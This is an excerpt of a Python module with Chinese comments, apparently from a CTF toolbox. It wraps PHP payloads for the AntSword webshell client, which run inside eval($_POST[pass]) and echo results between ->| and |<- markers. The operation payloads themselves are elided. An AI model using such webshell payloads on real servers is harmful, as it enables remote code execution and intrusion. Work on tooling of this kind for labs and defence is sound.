...
约定：核心代码在 eval($_POST[pass]) 内执行；输出以起止标记（默认 `->|`/`|<-`）
包裹，客户端据标记切出结果。参数以 base64 常量烘焙进载荷。除 read 外结果为明文，
read 结果为 base64。首行嵌入 `/*CTFBOX_AS|op|b64...*/` 机读标签供测试解释器使用。
"""
...
def _wrap(tag: str, body: str, marker: tuple[str, str]) -> str:
    """公共外壳：执行 body（须把结果写入 $o），用起止标记包裹回显。"""
    start, end = marker
    return (
        f"{tag}\n"
        f'$o="";\n'
        f"{body}\n"
        f'echo "{start}";echo $o;echo "{end}";'
    )
...
def render(operation: str, params: dict, marker: tuple[str, str]) -> str:
    ...
    raise ValueError(f"蚁剑 PHP 载荷不支持操作：{operation}")
